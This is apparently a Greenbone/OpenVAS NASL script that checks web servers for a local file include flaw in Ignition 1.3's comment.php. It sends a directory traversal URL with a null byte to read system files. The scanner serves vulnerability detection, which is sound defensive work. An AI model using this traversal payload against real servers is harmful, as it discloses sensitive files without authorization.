if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103016" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-01-07 13:52:38 +0100 (Fri, 07 Jan 2011)" );
	script_bugtraq_id( 45687 );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_name( "Ignition 'comment.php' Local File Include Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/45687" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Ignition is prone to a local file-include vulnerability because it
  fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information and to execute arbitrary local scripts in the context of the webserver process.
  This may allow the attacker to compromise the application and the computer. Other attacks are
  also possible." );
	script_tag( name: "affected", value: "Ignition 1.3 and prior versions are vulnerable." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/ignition", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	buf = http_get_cache( item: dir + "/login.php", port: port );
	if(!buf || !IsMatchRegexp( buf, "^HTTP/1\\.[01] 200" ) || ( !ContainsString( buf, "href=\"admin.css\"" ) && !ContainsString( buf, "action=\"login.php\">" ) )){
		continue;
	}
	for file in keys( files ) {
		url = NASLString( dir, "/comment.php?blog=", crap( data: "../", length: 3 * 9 ), files[file], "%00" );
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );
